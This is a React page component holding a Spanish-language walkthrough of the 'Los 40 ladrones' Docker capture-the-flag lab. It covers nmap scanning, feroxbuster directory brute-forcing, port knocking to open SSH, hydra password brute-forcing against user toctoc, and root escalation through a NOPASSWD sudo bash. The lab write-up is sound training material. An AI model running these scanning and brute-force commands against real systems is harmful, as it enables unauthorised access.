import CodeBash from "@/components/CodeBash";
import labs from "../labs";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb";
import { ChevronDown, Slash } from "lucide-react";
import { Link } from "react-router-dom";
function Los40Ladrones() {
  const lastPath = location.pathname.split("/").filter(Boolean).pop();
  return (
    <div>
      <Breadcrumb>
        <BreadcrumbList>
          <BreadcrumbItem>
            <Link to="/">Home</Link>
          </BreadcrumbItem>
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <DropdownMenu>
              <DropdownMenuTrigger className="flex items-center gap-1">
                Docker Labs
                <ChevronDown className="h-4 w-4" />
              </DropdownMenuTrigger>
              <DropdownMenuContent align="start">
                {labs.map((lab) => (
                  <Link
                    to={
                      "/docker-labs/" + lab.toLowerCase().split(" ").join("-")
                    }
                  >
                    <DropdownMenuItem key={lab}>{lab}</DropdownMenuItem>
                  </Link>
                ))}
              </DropdownMenuContent>
            </DropdownMenu>
          </BreadcrumbItem>{" "}
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <BreadcrumbPage className="text-primary">
              {lastPath!.at(0)!.toUpperCase() +
                lastPath!.substring(1).split("-").join(" ")}
            </BreadcrumbPage>
          </BreadcrumbItem>
        </BreadcrumbList>
      </Breadcrumb>
      <div className="flex items-center flex-col">
        <h1 className="text-5xl mt-3 mb-5 font-bold">Los 40 ladrones</h1>
        <div className="md:px-48 w-full">
          <h2 className="my-2 text-3xl font-bold">
            Comenzamos inicializando la maquina
          </h2>
          <CodeBash text="sudo bash auto_deploy.sh los40ladrones.tar" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Escaneo de puertos</h2>
          <p>Vamos a empezar el escaneo de puertos usando nmap</p>
          <CodeBash text="nmap -p- --open 172.17.0.2 -Pn" />
          <p>Este es el resultado del escaneo</p>
          <CodeBash
            text="Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Puerto 80</h2>
          <p>
            Se muestra la pagina por defecto de apache, no parece haber algo
            interesante
          </p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Ataque de navegacion forzada
          </h2>
          <p>Usaremos feroxbuster para encontrar algo interesante</p>
          <CodeBash text="feroxbuster -u http://172.17.0.2:80 -t 500 -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -g" />
          <CodeBash text="200      GET        3l       20w      111c http://172.17.0.2/qdefense.txt" />
          <p>Encontramos un archivo llamado qdefense.txt el cual contiene</p>
          <CodeBash
            text="Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639"
          />
          <p>
            Vemos un posible usuario: toctoc y 3 numeros, revisaremos los
            puertos filtrados para ver si podemos extraer algo mas de
            informacion
          </p>
          <CodeBash text="nmap --top-ports 25T -n 172.17.0.2" />
          <p>El resultado es este</p>
          <CodeBash
            text="PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   filtered ssh
23/tcp   filtered telnet
25/tcp   filtered smtp
53/tcp   filtered domain
80/tcp   open     http
110/tcp  filtered pop3
111/tcp  filtered rpcbind
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
143/tcp  filtered imap
199/tcp  filtered smux
443/tcp  filtered https
445/tcp  filtered microsoft-ds
587/tcp  filtered submission
993/tcp  filtered imaps
995/tcp  filtered pop3s
1025/tcp filtered NFS-or-IIS
1720/tcp filtered h323q931
1723/tcp filtered pptp
3306/tcp filtered mysql
3389/tcp filtered ms-wbt-server
5900/tcp filtered vnc
8080/tcp filtered http-proxy
8888/tcp filtered sun-answerbook"
          />
          <p>
            Usaremos knock para abrir algun puerto con el codigo que nos dieron
            en el txt
          </p>

          <CodeBash text="knock 172.17.0.2 7000 8000 9000 -v" />
          <p>
            Luego de ejecutar ese codigo vemos que se abrio un puerto a la hora
            de volver a hacer un scaneo
          </p>
          <CodeBash
            text="PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http"
          />
          <p>Se abrio el puerto 22 ssh</p>
          <p>Hacemos un ataque de fuerza bruta con hydra</p>
          <CodeBash text="hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64" />
          <p>El resultado es el siguiente</p>
          <CodeBash
            text="[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 559.00 tries/min, 559 tries in 00:01h, 14343883 to do in 427:40h, 20 active
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat"
          />
          <p>Conectamos por ssh</p>
          <CodeBash text="ssh toctoc@172.17.0.2" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de privilegios
          </h2>
          <p>
            Una vez dentro vemos que comandos podemos usar para obtener acceso
            root
          </p>
          <CodeBash text="sudo -l" />
          <p>El resultado es el siguiente</p>
          <CodeBash
            text="User toctoc may run the following commands on 53e56ded2b41:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function"
          />
          <p>
            Vemos que podemos acceder a una bash como root, para esto usamos el
            comando
          </p>
          <CodeBash text="sudo -u root /opt/bash" />
          <p>Y eso es todo!!!! Conseguimos acceso root en la maquina</p>
          <CodeBash
            text="root@53e56ded2b41:/# whoami
root
root@53e56ded2b41:/#"
          />
        </div>
      </div>
    </div>
  );
}

export default Los40Ladrones;
